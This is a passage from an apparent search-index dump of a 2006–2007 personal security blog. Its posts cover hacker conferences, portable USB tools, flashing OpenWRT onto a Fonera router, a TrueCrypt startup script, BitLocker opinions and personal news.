very cool interview with Dark Tangent, the founder of Defcon, that was done recently. [youtube=http://www.youtube.com/watch?v=lg6bQMTjHCE\u0026w;=425\u0026h;=350] ","date":"2007-08-02","objectID":"https://malicious.link/posts/2007/200782defcon-and-an-interview-with-dark-tangent-html/:0:0","tags":["Uncategorized"],"title":"DEFCON and an interview with Dark Tangent","uri":"https://malicious.link/posts/2007/200782defcon-and-an-interview-with-dark-tangent-html/"},{"categories":null,"content":"Originally Posted on TECH.NOCR.AT @ http://tech.nocr.at/content/view/22/1/ Secunia.com has been a great resource of vulnerability and virus information over the years for Black, Grey, and White hat hackers alike. Recently they released a BETA project that looks promising and could be the first step into a “package manager” for Windows. In there own words: A new addition to the Secunia Software Inspector series, the free Secunia Personal Software Inspector (PSI), is now available for BETA testing. Capable of detecting and categorizing more than 4,200 applications. So far, I have run it on a Vista Ultimate and XP SP2 box and it has come back with some impressive results. It found some software that I hate to admit, had totally forgotten about, on my system that was out of date. As for cons, I have only found two thus. One, it detected my Firefox install as 2.0.0.4 instead of 2.0.0.6. The second being, not so much a technical fault, but a person preference. It is not portable, you install it and it works on that box. What they don’t tell you on the site is that when it detects out of date applications, it provides you a direct download link. This is good and bad, you are not seeing where this download is coming from, so you are trusting Secunia. It’s good for us lazy computer geeks though, because it is only one click. Finally, they provide you a detailed write up on the out of date software you have and links to find out what vulnerabilities affect that software package. In closing, this is a great piece of software that I will definitely keep tabs on and take around with me, along with my File Hippo Updater Check out and follow this project at https://psi.secunia.com/ ","date":"2007-08-01","objectID":"https://malicious.link/posts/2007/200781are-you-secure-secunia-to-the-rescue-html/:0:0","tags":["Uncategorized"],"title":"Are you secure: Secunia to the rescue","uri":"https://malicious.link/posts/2007/200781are-you-secure-secunia-to-the-rescue-html/"},{"categories":null,"content":"Alright, this is just a quick update. The torrent is still up and functional. Also, I just had to post this. It has a weak but feasible link to tech. http://www.votemoojj.com/stuff/shoes/index.html ","date":"2007-07-31","objectID":"https://malicious.link/posts/2007/2007731transformers-html/:0:0","tags":["Uncategorized"],"title":"Transformers","uri":"https://malicious.link/posts/2007/2007731transformers-html/"},{"categories":null,"content":"A couple people have asked for links on where I got this portable app or that, well, all over really. Here are a few links to get you started: http://www.dirk-loss.de/win-tools.htm http://www.tinyapps.org/ http://www.portablefreeware.com/ http://en.wikipedia.org/wiki/List_of_portable_applications http://standalone.atspace.org/ http://portableapps.com/apps http://www.kikizas.net/en/usbapps.html Also, I gave some of the apps their portability myself. It’s a easy process. Drag and drop an installer file “setup.exe” or “whatever.msi” into Universal Extractor. What you are going to get is a folder right where that installer is, with the same name as the installer. Open the folder and you will have a couple folders. Usally and “app” folder. Check inside, and usually you have the application itself that you were supposed to install. Run it, see if it works by itself, take it to another computer, try it there. If so, you have yourself your own personal portable app. Have fun, and if you find an app that you can’t live without or think is just plain cool, shoot me a link, I’ll try it out, and it may just become the next app I show on Hak.5 or The Portable Admin. Giving credit of course. mubix [EDIT]It has been requested that I post a link to sysinternals, since I have their tools in my torrent. Well. I have one rule on my blog: No links to Microsoft. Sorry.[EDIT] ","date":"2007-07-12","objectID":"https://malicious.link/posts/2007/2007712usb-sauces-and-the-making-of-apps-html/:0:0","tags":["Uncategorized"],"title":"USB Sauces and the making of Apps","uri":"https://malicious.link/posts/2007/2007712usb-sauces-and-the-making-of-apps-html/"},{"categories":null,"content":"I don’t use Wine. It’s difficult to get anything working and a pain once it is. However since I found out about the Wine-Doors project, it’s made me go back on that thought. It’s a fairly new project, but well on it’s way to being an enabler for a great many users. A great many users have been looking for that one last thing, to get them over the hump of still using Windows. Some tried Wine, and couldn’t get it to work properly, like myself, that is where Wine-Doors helps out. Out of the box it installs things like the Microsoft core fonts, winegecko, mozilla activex control and the visual C++ runtime, which resolves a great many discrepancies that users wrestle with in wine. Once installed, you can install some of the hardest Wine apps with the grace of the double click: World of Warcraft Halflife 2 (Steam) iTunes Flash 8 And many more, with more all the time. You can check out the growing list at the Wine-Doors wiki under BundledWith mubix ","date":"2007-07-10","objectID":"https://malicious.link/posts/2007/2007710wine-doors-html/:0:0","tags":["Uncategorized"],"title":"Wine Doors","uri":"https://malicious.link/posts/2007/2007710wine-doors-html/"},{"categories":null,"content":"Yup, it’s finally here. Download it here! RIGHT CLICK AND SAVE AS So now that is done, I get to talk about other things that I am getting into: Wubi “Linux” Installer: http://wubi-installer.org/ This is actually pretty amazing. What it does is automagically downloads an ISO (takes a while), makes a virtual disk, puts entries in the Windows boot loader and tells you to restart. When you restart it boots to the virutal disk and installs the version of Ubuntu you chose. From then on (yes there is an uninstaller) you have a “dual boot” machine without having to repartition your system. Tcpxtract and Foremost: These application try to reconstruct files from network streams or captures. I haven’t delved to far into these yet, but they look pretty interesting. I’m thinking tcpxtract + ettercap And I have been wanting to setup Nagios and Cacti for the longest time, I just have never gotten around to it. Thoughts? Is it worth it? We set it up at ShmooCon but I really didn’t have time to get hands on it. Enjoy the torrent. If you can’t figure out a program, just post a comment and I’ll explain it. mubix P.S. You guys better appreciate this, I am up at 3:37 AM getting this out to you guys ","date":"2007-07-07","objectID":"https://malicious.link/posts/2007/200777usb-tools-torrent-and-more-html/:0:0","tags":["Uncategorized"],"title":"USB Tools Torrent and more!","uri":"https://malicious.link/posts/2007/200777usb-tools-torrent-and-more-html/"},{"categories":["wireless"],"content":" Of course I am a little late, but litterally the ULTIMATE guide to wrt54g hacking is shipping: http://www.amazon.com/Linksys-WRT54G-Ultimate-Hacking-Asadoorian/dp/1597491667 Also, you can check out Paul Asadoorian and Larry Pesce at http://www.pauldotcom.com You can also download the PDF version of the book at: http://www.syngress.com/catalog/?pid=4170 CONGRATS GUYS… now where is my free copy? mubix ","date":"2007-06-27","objectID":"https://malicious.link/posts/2007/2007-06-27-linksys-wrt54g-ultimate-hacking/:0:0","tags":null,"title":"Linksys WRT54G Ultimate Hacking","uri":"https://malicious.link/posts/2007/2007-06-27-linksys-wrt54g-ultimate-hacking/"},{"categories":null,"content":"I received a Fonera router from my friend boxgamex and what was the first thing I thought of doing to it? Slaping OpenWRT on it and going to town. Well it took me 2 days of intense R\u0026D but here is what I can tell you to make your life a little easier than mine was: I am definitely not going to reinvent the wheel, there are some great tutorials out there and I am going to link to them through out this article. First of all you have to decide if you are going to do straight OpenWRT or DD-WRT. Both have pluses and minuses. You just have to decide for yourself which you want, and you can always change it out. Also, the best setup for this is having your computer directly connected to the Fonera Router. A few things you need to download before you start: Putty (only for the SSH part, using Putty for Telnet makes it impossible to backspace errors) HTTP File Server (for loading files) Tftpd32 (The easier way to load files) SSH Enabler (just an html doc right click and save it) openwrt-ar531x-2.4-vmlinux-CAMICIA.lzma (You’ll need it) out.hex The is the super secret code that lets you break free from the oppressive FON empire. Now, you can either put DD-WRT or OpenWRT on the FON so here are the links for each: http://www.dd-wrt.com/dd-wrtv2/down.php?path=downloads%2Fbeta%2FFONERA/ http://downloads.openwrt.org/snapshots/atheros-2.6/ All you need from one of the above links is a root file system (rootfs or jffs) and a kernel (vmlinux). And you are done. Step 1: Get SSH Access, block the FON updates, and enable SSH on Boot (No problems here, just follow the guide (GUIDE LINK) and you are set. Step 2: Enable “RedBoot” and boot into it. (Easy enough, using the guide above) HINT I have found the best way to Telnet in before the router loads the kernel is to have a Ethereal capture or tcpdump running and wait/watch for traffic from 192.168.1.254. As soon as it shows up hit ENTER on your prepared command ( telnet 192.168.1.254 9000 ) oh and don’t use PuTTy for the telnet portion, unless you type perfectly. Step 3: Load the new FS and Kernel. The biggest problems here is getting the memory positions (i.e. 0x80000000) correct. I will link to all of the tutorials that I have used. The memory positions that worked for me are the ones from the guide that I initially linked you to, at the bottom of this posting I will like you to a few others guides that have different memory positions to try out. HINT Now this is a big one. Unless you want to go completely bonkers leave the telnet session alone! Step away from the keyboard and don’t touch the computer. If you run into a command (the “fs create” ones) that seems like it is frozen. Step away. It will finish. If you hit enter or any other button, the telnet client will try and poll the telnet server (your FON router) to keep the connection alive, since your FON router at that moment would be reformatting itself your telnet session would close. And yes, it took me forever to figure that one out. Step 4: Reboot into your brand spanking new router. What you do from here with it, is on you. Oh, now that you have gone through the hard part, here is a link to a GUI that does it all for you: Flashing GUI: http://berlin.freifunk.net/sven-ola/fonera/ Links: Kamikaze Options: http://wiki.openwrt.org/OpenWrtDocs/KamikazeConfiguration OpenWRT Forum for Kamikaze: http://forum.openwrt.org/viewforum.php?id=10 OpenWRT Fonera Info: http://wiki.openwrt.org/OpenWrtDocs/Hardware/Fon/Fonera Best Guide (DD-WRT): http://uselesshacks.com/?p=23 Another Guide: http://www.mcgrewsecurity.com/blog/?p=28 Firmware Downloads: http://downloads.openwrt.org/snapshots/atheros-2.6/ http://www.dd-wrt.com/dd-wrtv2/down.php?path=downloads%2Fbeta%2FFONERA/ Flashing GUI: http://berlin.freifunk.net/sven-ola/fonera/ mubix P.S. My USB list/torrent is next on my TO-DO list, again, sorry for the wait. ","date":"2007-06-24","objectID":"https://malicious.link/posts/2007/2007624fonera-fun-html/:0:0","tags":["Uncategorized"],"title":"Fonera Fun","uri":"https://malicious.link/posts/2007/2007624fonera-fun-html/"},{"categories":null,"content":"You know, I putting together a folder that would contain a copy of all my USB apps, minus the config files and I realized; Some of these people might get a bit miffed about me redistributing their software. So, I know you guys have waited forever and a day already, but I have to drag it out just a tad more. I am going to do the work of checking into each license to see if I can redistribute it. In the mean time and while I am doing that, I will publish a list of all the apps. That way, you can either wait and get the torrent with them all, or download them individually when I publish the list. Again, sorry for the delay, I know you wouldn’t wish to beseech me a little saving of ones arse. ","date":"2007-06-12","objectID":"https://malicious.link/posts/2007/2007612usb-torrent-html/:0:0","tags":["Uncategorized"],"title":"USB Torrent","uri":"https://malicious.link/posts/2007/2007612usb-torrent-html/"},{"categories":["Rant"],"content":"So I am a complete noob when it comes to multicast and recently I have been hearing about it more and more. I know it’s been out there since the dawn of time but I simply thought it was a way of broadcasting video across the network. WRONG. So for those who don’t know, and correct me if I am wrong, a computer or device sends out a multicast packet headed for a 244.X.X.X and just like a broadcast packet (255.255.255.255) it gets heard by everyone. Also like a broadcast packet, it falls within the broadcast boundary. So, why bring this up? Because I was thinking that a Multicast scanner would be a great tool for pentesters to use inside of a network to get a more complete picture of internal services. Also, as per the torrent. I have started assembling and organizing it. This way each item will be in an archive that you can choose to download or not from the torrent. Family is still in town so bare with me just a bit longer. ","date":"2007-06-01","objectID":"https://malicious.link/posts/2007/200761multicast-and-some-random-thoughts-html/:0:0","tags":["Rant"],"title":"Multicast and some random thoughts","uri":"https://malicious.link/posts/2007/200761multicast-and-some-random-thoughts-html/"},{"categories":["family"],"content":" Michael Noah Fuller 11:24 AM - May 13th, 2007 20 inches tall 7 lbs 15 oz Baby and Momma are doing great. those of you waiting on my USB torrent, I’m sorry to say, you have officially been trumped. I will get it up there some time in the next two weeks. ","date":"2007-05-14","objectID":"https://malicious.link/posts/2007/2007-05-14-michael-noah-fuller-aka-mubix-21/:0:0","tags":null,"title":"Michael Noah Fuller a.k.a. Mubix 2.1","uri":"https://malicious.link/posts/2007/2007-05-14-michael-noah-fuller-aka-mubix-21/"},{"categories":null,"content":"Ok, so I got a lot of questions of how everything works on my encrypted U3 drive. I started off with the Here is what goes in my go.cmd file from the SwitchBlade @echo off truecrypt /q /v saved.pst /lo o:pstart.exe So what I am doing here is connecting the saved.pst file as a truecrypt volume using /v. I am using the /q so that it doesn’t open the whole Truecrypt GUI. The /lo tells truecrypt to mount it as the drive letter O:. It will prompt you for your password, it will mount, and then it will run pstart.exe from your mounted O: drive. Where to get what I went over in the episode: Truecrypt: http://www.truecrypt.org/ Software Information for Windows: http://www.gtopala.com/ Baregrep: http://www.baremetalsoft.com/baregrep/ I posed this question to the forums, but I wanted to ask here as well. My USB stick is about 3 gigs worth of tools. Would ya’ll be interested in a torrent with all of those tools in it? Leave your comments. mubix ","date":"2007-05-09","objectID":"https://malicious.link/posts/2007/200759hak5-2x10-usb-goodies-with-encryption-html/:0:0","tags":["Uncategorized"],"title":"Hak.5 2x10 - USB Goodies with Encryption","uri":"https://malicious.link/posts/2007/200759hak5-2x10-usb-goodies-with-encryption-html/"},{"categories":null,"content":"As many of you know, I ran Hak.5 Radio for the longest time, and I am now a co-owner of the phoenixed Hak.5 radio station effort: KGMR Radio. So it shouldn’t suprise you to see that I fully support the following and expect you.. YES YOU, to click the link and tell your congress man or woman what is on my mind. ","date":"2007-04-26","objectID":"https://malicious.link/posts/2007/2007425save-internet-radio-save-the-world-html/:0:0","tags":["Uncategorized"],"title":"Save Internet Radio, Save the World","uri":"https://malicious.link/posts/2007/2007425save-internet-radio-save-the-world-html/"},{"categories":null,"content":"When I checked my Amazon account today, I was amazed to find that about 90% of the books that I have in my “Saved for later” cart have increased in price. What’s going on? I guess this raises a good question. What regulates the rise and fall of prices on the internet? Do you “shop around” for books on the internet? Or do you just go to Amazon.com and buy what you need? I definitely fall in the latter category. Do you know any good sites that compare prices on books? Other than the deceased Froogle and other similar all encompassing consumer compare sites. Well, if you get nothing out of this article other than a list of good books to read, then I have done my job. Important Messages Please note that the price of Extrusion Detection: Security Monitoring for Internal Intrusions has decreased from $34.49 to $32.99 since you placed it in your Shopping Cart. Items in your cart will always reflect the most recent price displayed on their product detail pages. Please note that the price of Extreme Exploits: Advanced Defenses Against Hardcore Hacks (Hacking Exposed) has increased from $31.49 to $33.99 since you placed it in your Shopping Cart. Items in your cart will always reflect the most recent price displayed on their product detail pages. Please note that the price of The Art of Deception: Controlling the Human Element of Security has increased from $25.19 to $34.19 since you placed it in your Shopping Cart. Items in your cart will always reflect the most recent price displayed on their product detail pages. Please note that the price of 1337 h4x0r h4ndb00k has increased from $10.19 to $11.69 since you placed it in your Shopping Cart. Items in your cart will always reflect the most recent price displayed on their product detail pages. Please note that the price of Stealing the Network: How to Own the Box has decreased from $34.47 to $32.97 since you placed it in your Shopping Cart. Items in your cart will always reflect the most recent price displayed on their product detail pages. Please note that the price of The Unofficial Guide to Ethical Hacking, Second Edition has increased from $27.99 to $32.99 since you placed it in your Shopping Cart. Items in your cart will always reflect the most recent price displayed on their product detail pages. Please note that the price of Google Hacking for Penetration Testers has increased from $24.72 to $29.67 since you placed it in your Shopping Cart. Items in your cart will always reflect the most recent price displayed on their product detail pages. Please note that the price of Gray Hat Hacking : The Ethical Hacker’s Handbook has decreased from $34.49 to $32.99 since you placed it in your Shopping Cart. Items in your cart will always reflect the most recent price displayed on their product detail pages. Please note that the price of Rootkits: Subverting the Windows Kernel (Addison-Wesley Software Security Series) has increased from $25.64 to $32.99 since you placed it in your Shopping Cart. Items in your cart will always reflect the most recent price displayed on their product detail pages. Please note that the price of Silence on the Wire: A Field Guide to Passive Reconnaissance and Indirect Attacks has increased from $22.37 to $26.37 since you placed it in your Shopping Cart. Items in your cart will always reflect the most recent price displayed on their product detail pages. Please note that the price of Nessus, Snort, \u0026 Ethereal Power Tools: Customizing Open Source Security Applications (Jay Beale’s Open Source Security) (Jay Beale’s Open Source Security) has increased from $27.57 to $29.16 since you placed it in your Shopping Cart. Items in your cart will always reflect the most recent price displayed on their product detail pages. Please note that the price of Intrusion Detection with SNORT: Advanced IDS Techniques Using SNORT, Apache, MySQL, PHP, and ACID has increased from $27.89 to $32.84 since you placed it in your Shopping Cart. Items in your cart will always reflect the most re","date":"2007-04-25","objectID":"https://malicious.link/posts/2007/2007425amazon-prices-increase-html/:0:0","tags":["Uncategorized"],"title":"Amazon Prices Increase!","uri":"https://malicious.link/posts/2007/2007425amazon-prices-increase-html/"},{"categories":["Rant"],"content":"Recently I was listening to Episode 66 of PaulDotCom Security Weekly and they briefly touched on Packetfence. Packet Fence is a Open Source NAC. This is the first time that I have really gotten hand on a NAC. I have heard of NAC and at ShmooCon Labs, I was part of Simple Nomad’s team and Vernier’s IPS/NAC. However, I didn’t get a chance to get hands on during the con. So that puts me in the “noob” category. So, when I explained NAC to the team at work, they asked a question I couldn’t answer with any technical expertise. So I will pose the question to you the reader: What do you use NAC systems for? Comment here. or email me. Also, the Hack or Halo image has been fixed and is up: http://blog.vulnerableminds.com/2007/04/shmoocon-07-hack-or-halo-virtual.html ","date":"2007-04-18","objectID":"https://malicious.link/posts/2007/2007418nac-in-use-html/:0:0","tags":["Rant"],"title":"NAC in use","uri":"https://malicious.link/posts/2007/2007418nac-in-use-html/"},{"categories":["shmoocon","cons"],"content":" So you couldn’t make it. No worry, you have undoubtedly been going through the videos from shmoocon already. If you haven’t yet, you should, they were well done and better than last year. But, what you might not have done yet is the Hack or Halo contests. Update: We’ve determined the images have become corrupt during one of the transfers and have been taken offline until the problem has been fixed. It should be fixed by Wednesday night. For the “Hack” portion of the contest, you can find the images for the contest machines here: (DISCLAIMER: THIS IS A 1.8 GB DOWNLOAD) http://blog.vulnerableminds.com/2007/04/shmoocon-07-hack-or-halo-virtual.html Fastest (FTP) Faster (HTTP) Fast (HTTP) Fast (HTTP) And the Halo portion you can find here: Halo ","date":"2007-04-10","objectID":"https://malicious.link/posts/2007/2007-04-10-missed-shmoo-now-you-can-experience-in-the-comfort-of-your-home/:0:0","tags":null,"title":"Missed Shmoo? Now you can experience in the comfort of your home.","uri":"https://malicious.link/posts/2007/2007-04-10-missed-shmoo-now-you-can-experience-in-the-comfort-of-your-home/"},{"categories":null,"content":"The contest that won two “hackers” PS3s at ShmooCon is now open to the public. I found this post on http://hkashfi.blogspot.com/index.html ShmooCon07 “Hack it” Contest During Shmoocon2007 there was a contest open to interested hackers. If you’re curious about it but hadn`t chance to join the con, well it’s still open for you to check your skills but don’t expect any reward :\u003e If you like to get familiar with challenges in Cons, you can try this one. It’s consisted of 8 levels, each one require different class of skills. you can try it HERE . If you’re not 31337 enough to solve them, here’s the answers for you but I highly recommend you NOT to get it before giving the challenge a try . Such challenges are cool until you do not have the answers and should get them yourself . Finally because this challenge comes from ShmooCon does NOT mean it’s something magical or hard to solve. By S. Hamid Kashfi I suppressed the link to the answers. You can go to Kashfi’s page if you want those, you cheater. mubix ","date":"2007-04-03","objectID":"https://malicious.link/posts/2007/200743think-you-can-hack-it-in-my-world-prove-it-html/:0:0","tags":["Uncategorized"],"title":"Think you can hack it in my world? Prove it.","uri":"https://malicious.link/posts/2007/200743think-you-can-hack-it-in-my-world-prove-it-html/"},{"categories":null,"content":" So, it’s over. ShmooCon and the meet up is finally over. I had a blast, but it put a tax on my time like you wouldn’t believe. I can’t imagine what life is like for the Shmoo group, especially Heidi. I will be posting all of the pictures on flickr shortly. I got to do a lot of other things at ShmooCon other than just the meet up. I had the distinct opportunity to help bag over 1000 bags with swag, Shmooballs, and adverts. And, yes, if you are reading this Freshman, I AM COMPLAINING! However, I will not complain about doing ShmooCon Labs. Here is the network diagram if you wanna see the extent of what would would have paled most enterprise networks. Ok, as for the meet up, I need a name for it, and I am totally not creative, so those 3 who read my blog, I charge you to help a fellow Internet addict out. We had people come from Pauldotcom, Hak.5, Cyberspeak, Martin Mckeay, SploitCast, Simple Nomad, Rodney from the Shmoo Group, Render Man, and a surprise showing of two other security podcasts you should definitely check out, Secthis and Cmdln. It went great except for a few things, which didn’t make it bad, just a little more interesting. Lets just say Murphy tried very hard. The manager that knew about our reservation, that gave us the ok to keep the place open late, and have a tab, went MIA. So we improvised by using a gift card that kept being passed around, taking over the whole place so that a reservation wasn’t needed, and moving the party to another bar after they forced us out. The travel to the bar was another story all by it’s self. We walk about 1.5 miles to the next bar, which no one was sure where it was. Now, “WE” is about 40 of the 50 to 60 people that were at Chipotle, all walking on the side walk, half drunk, a mile and a half. You are now thinking one of two things: 1. That would have been hilarious to see, or 2. People will walk the desert for free beer/drinks. Check out all the media coverage of the event: http://www.technorati.com/photos/tag/shmoocon mubix ","date":"2007-03-28","objectID":"https://malicious.link/posts/2007/2007327shmoocon-infected-with-podcasters-html/:0:0","tags":["IPTV"],"title":"ShmooCon infected with podcasters","uri":"https://malicious.link/posts/2007/2007327shmoocon-infected-with-podcasters-html/"},{"categories":["Microsoft"],"content":"I know that I said this was going to be a security blog, but I figured I would continue on my rant on Vista after this happened. Ok, so there I was… I saw on Betanews.com a article on Vista Hardware Assessment Tool Addresses Upgrade Dilemmas by Scott M. Fulton, III of Betanews, which toted of a Windows XP tool to check for hardware compatibility for Vista. Curiosity got the best of me, so I downloaded it (25.5 MB). I simply wanted to see if my machine could handle Vista. Installation starts and tells me that it needs SQL Server 2005 Express and that it is going to download and install it for me. And I’m thinking (Oh great, my computer is now going to have an outdated Microsoft SQL server on my system. yay me!) I click ok, whatever. It downloads, then installs SQL Server 2005 Express, and starts to install “Windows Vista Hardware Assessment” (just a tangent, but shouldn’t there be something like “tool” or “wizard” on the end of that?) and it gets to a certain point and stops for a bit. It continues after about 10 minutes. And then stops again at about 65%. At this point I need to go to bed and I do so. I wake up the next morning to be greeted with the following screen: Yes it was still at around 65% and no my computer wasn’t frozen. So I came to the conclusion that if I can’t even install the “Assessment” then my computer isn’t compatible. I also get the added treasure of a failed install of SQL Server 2005 Express. I wouldn’t suggest this tool until it gets looked at again, or some third party makes the same tool without the need of a insert expletive here SQL Server. But, that’s just my take on things, I’m just another security guy in a room with a small sign on the door that says “IT Dept”. What would I know? jd P.S. Richmond has tried it’s hand at WGA again. Check out my digg article here: http://www.digg.com/tech_news/Windows_Genuine_Advantage_Part_2 ","date":"2007-02-22","objectID":"https://malicious.link/posts/2007/2007222windows-vista-compatibility-html/:0:0","tags":["Microsoft"],"title":"Windows Vista Compatibility","uri":"https://malicious.link/posts/2007/2007222windows-vista-compatibility-html/"},{"categories":["Rant"],"content":"First of all, every blog entry on every blog, is in fact a RANT. So, stating that one is, is kind of pointless. That being said. Here is my rant: Now that I have changed this part of my blogisphere, I have been getting guff about not covering certain exploits and 0-days. So here it is: Microsoft Excel 0-day The easiest way to make a unix based system (Mac) insecure: • Step 1: Install a Microsoft Product as for the Windows Versions; DON'T OPEN ATTACHMENTS -While I am on the topic. Word users, watch out as well. milw0rm exploit #3260 I troll all the security sites with my RSS reader, and as soon as I find something that hasn’t been covered to death (i.e. ANOTHER Excel/Word exploit) I’ll post it up. I’m getting off my soap box. For those that have found my previous ‘rants’ informative and did not send me an email wining that I didn’t cove the aforementioned exploit. I apologize. But, that’s just my take on things, I’m just another security guy in a room with a small sign on the door that says “IT Dept”. What would I know? jd P.S. Now that I am sorta in the eZine world with the release of Analog.5 for Hak.5. I wanted to tag another eZine well worth reading. Rattle and the folks from .aware created the .aware eZine or lovingly called .behold check it out. ","date":"2007-02-21","objectID":"https://malicious.link/posts/2007/2007221on-a-rant-html/:0:0","tags":["Rant"],"title":"On a RANT","uri":"https://malicious.link/posts/2007/2007221on-a-rant-html/"},{"categories":["Microsoft"],"content":"Alright, before you start sending hate mail or posting comments on how you hate my mother for giving birth to me, bare with me. So, Microsoft puts out their new operating system that is “A New Day”. Microsoft at the launch states that they are already “full speed ahead on SP1”. Microsoft releases that they will be releasing Vienna’s successor in 2009. Those are the facts. Or, as I like to call them “Time-insensitive” facts. Now time to as you a question: Who is Microsoft’s biggest customer? That’s RIGHT! Big business. Now, what am I thinking as a “Big business” executive that is looking to upgrade my infrastructure? Right again! I am going to think that Vista has held up this long, I am going to wait for Vienna and save myself the time and money of upgrading to an OS that already has vulnerabilities that aren’t patched, “a la SP1”, that will cost me millions to deploy globally, and it’s server counterpart is still in beta, or, just wait for Vienna and hope for the best. It’s a hard decision and that is why they get paid the big bucks, but come on Microsoft. The whole wow, shock and amaze factor is gone and these corporate execs are put between a rock and a hard place. But, that’s just my take on things, I’m just another security guy in a room with a small sign on the door that says “IT Dept”. What would I know? jd ","date":"2007-02-12","objectID":"https://malicious.link/posts/2007/2007212microsoft-what-are-you-doing-html/:0:0","tags":["Microsoft"],"title":"Microsoft. What are you doing?!","uri":"https://malicious.link/posts/2007/2007212microsoft-what-are-you-doing-html/"},{"categories":["Microsoft"],"content":"I’m going to start this whole security thing by taking a look at the new BitLocker technology built in to Vista. Before I begin, I want to specify that I am by no means an expert on BitLocker and all of my information comes from the Microsoft site and a face to face with the engineers at Launch Tour 2007. So lets begin with requirements. You must have a modern motherboard which has a “TPM” or Trusted Platform Module. The reason I say must, is that there IS a third mode where you store your keys on a USB drive. However, if you do this, you are carrying around your keys in clear text on a USB drive. If that didn’t scare you in the least bit, then you are either a rather large individual who scares people enough for them not to want to get near you, or you don’t care about security, in which case you don’t need BitLocker. So, now that we have the disclaimer out of the way, here is a thousand word on how Bitlocker works: Basically, your keys are stored on this TPM and are used to unlock the MFT, which has the full volume keys that unlocks the rest of the drive. Cool, we’re in the clear, right? Q1: What if I want to put the HD into another computer? The new computer’s TPM will not have the correct keys. Well, if the computer was connected and a part of an AD domain err.. I mean “tree”, then you can supposedly find those keys and “PUSH” them to the new TPM. No, the engineer did not know how to “PUSH” said keys. However you could also unlock it using a 36 hex value key. That you can right down.. on a piece of paper… that you might keep near or with your laptop… Q2: What are the other two modes, and which one do I want? Transparent operation mode: In this mode, BitLocker is completely transparent to the user. You just boot and log in. Bitlocker still encrypts the whole drive as you see above. But the “authentication” step is where Bitlocker checks to see if “boot files” have remained unmodified. I would be interested in finding out exactly which files it checks and what it checks for. User authentication mode: In this mode, during boot, before any HD files are accessed, the user is prompted for a PIN. In my opinion, if your boss is dead set on using Bitlocker on all of your drives, you should insist on this one. (But guess what, for all those roadies that keep your computers in “Sleep”, BitLocker doesn’t mean anything. With a U3 device and a cool cygwin script, I can make a unencrypted copy of the system, even if it’s locked out) So to break it down in conclusion: You have to have newer hardware, AD, roadies who don’t rely on “SLEEP” and educated users. Something tells me the last part of that would be a bit hard to accomplish. But, that’s just my take on things, I’m just another security guy in a room with a small sign on the door that says “IT Dept”. What would I know? jd For more info, check out the wikipedia article: Wikipedia -\u003e Bitlocker ","date":"2007-02-05","objectID":"https://malicious.link/posts/2007/200725bitlocker-html/:0:0","tags":["Microsoft"],"title":"BitLocker","uri":"https://malicious.link/posts/2007/200725bitlocker-html/"},{"categories":null,"content":"Well, since they mentioned room362.com on Hak.5 live, I guess I have to update this more often. At first I was updating my Vox and this with the same stuff, and then it became just Vox. So I have decided to separate the way I use each. From now on this will be a security blog. More to come. (Yes, actually) ","date":"2007-02-05","objectID":"https://malicious.link/posts/2007/200725hak5-live-html/:0:0","tags":["Uncategorized"],"title":"Hak.5 Live","uri":"https://malicious.link/posts/2007/200725hak5-live-html/"},{"categories":["Rant"],"content":" Boss! I can't come in today. I woke up this morning and found 20 inches of snow in front of my drive way. Don’t we all wish it was this simple. Anyways, I went home for Christmas, back to Oregon. Had a good time, got some good presents, yup… everything was good. New Years is coming up. 2007… yeah, the whole millennium thing is wearing off. As for the key chain, I got a cool skeleton key chain for Christmas that is almost impossible to fit in my pocket, but oh so worth it. To put a little bit of tech into this boring excuse for a post, I just learned of something called the Microsoft Action Pack. This is a 300 dollar investment that gets you dozens of copies of all of Microsoft’s products, legit, from Microsoft. Check out this link for more information. Or you can digg it. jd ","date":"2006-12-28","objectID":"https://malicious.link/posts/2006/20061228christmas-new-years-and-a-keychain-html/:0:0","tags":["Rant"],"title":"Christmas, New Years and a Keychain","uri":"https://malicious.link/posts/2006/20061228christmas-new-years-and-a-keychain-html/"},{"categories":null,"content":" It has been decided that I, yes, yours truely has been officially inducted into the Killer Coding Ninja Monkey University. There, I will study CS-AH2HC-B. I chose the ‘B’ track over the ‘A’ track because of the professorship at on ‘B’ campus. Being a freshman at KCNM U is quite an honor, and I look forward to good times, and possible joining a frat. Dare I say, even the Lamda Lamda Lamda frat may find me worthy. Enough of that, I am off to get my books. Come visit some time. jd ","date":"2006-09-26","objectID":"https://malicious.link/posts/2006/2006926killer-coding-ninja-monkey-university-html/:0:0","tags":["Uncategorized"],"title":"Killer Coding Ninja Monkey University","uri":"https://malicious.link/posts/2006/2006926killer-coding-ninja-monkey-university-html/"},{"categories":["Hak.5"],"content":"So, Hak.5 Radio is really taking off! We are now certified free and clear, you can check it out below. Just wanted to make a quick quip, more later. ","date":"2006-09-13","objectID":"https://malicious.link/posts/2006/2006913hak5-radio-goes-legit-html/:0:0","tags":["Hak.5"],"title":"Hak.5 Radio goes legit","uri":"https://malicious.link/posts/2006/2006913hak5-radio-goes-legit-html/"},{"categories":null,"content":"Yah, I know, it’s a bit late in coming but Frank Linhares has finally gotten his butt in gear and posted Ep 30! Check it out at or you can subscribe to it via iTunes by clicking this link If you can’t find the link, try clicking on the image. Awesome job Frank! Welcome back to the podcasting realm. mubix ","date":"2006-08-08","objectID":"https://malicious.link/posts/2006/200688techphile-is-back-html/:0:0","tags":["Uncategorized"],"title":"techPhile is Back","uri":"https://malicious.link/posts/2006/200688techphile-is-back-html/"},{"categories":["gaming"],"content":"Sorry to get your hopes up, but other people have been waiting for this to happen too…. Well, a design team was actually formed and got together to build a “mod” for StarCraft based on the WarCraft 3 engine. Some are calling this StarCraft 2, however Blizzard has refrained from fomally answering any questions about the unofficial mod. http://www.wc3campaigns.net/revolution/forum/ mubix ","date":"2006-07-27","objectID":"https://malicious.link/posts/2006/2006-07-27-starcraft-2/:0:0","tags":null,"title":"StarCraft 2","uri":"https://malicious.link/posts/2006/2006-07-27-starcraft-2/"},{"categories":["wishlist"],"content":"I have decided this year, for my birthday, to create a list of so-called “WANTS”. I prefer to see them as “NEEDS”. I have intentionally created this list large, as to give the most choices when selecting a gift. I have also tried to provide links to where these items can be bought online for the least amount of money. I have intentionally left prices out of this, and the list is unordered. The top item does not denote the thing that I want the most. You will make me very happy by purchasing any of these items for me. My birthday is on the 30th, so act quickly ;-) Original XBOX: Click Here for Purchase Options PS3 - This item cannot be reordered yet, however a gift certificate or cash for the exact amount that the PS3 will be for would suffice perfectly. New battery for my dv1000 series HP: Click Here for Purchase Options New power supply for my Gaming box: Click Here for Purchase Options A New Motherboard and Processor and memory for my Gaming box: Processor: Click Here 